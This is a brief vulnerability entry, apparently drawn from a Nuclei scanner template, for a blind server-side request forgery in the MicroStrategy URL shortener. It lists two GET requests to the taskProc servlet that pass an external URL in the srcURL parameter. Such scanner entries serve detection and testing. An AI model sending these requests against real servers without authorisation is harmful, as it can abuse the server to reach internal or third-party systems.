# Vulnerability: MicroStrategy tinyurl - Server-Side Request Forgery (Blind)
**Classification:** CWE-918
**Source:** Nuclei Template (`microstrategy-ssrf.yaml`)

## Description
Blind server-side (SSRF) request forgery vulnerability on MicroStrategy URL shortener.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https://google.com
GET {{BaseURL}}/MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https://google.com
```

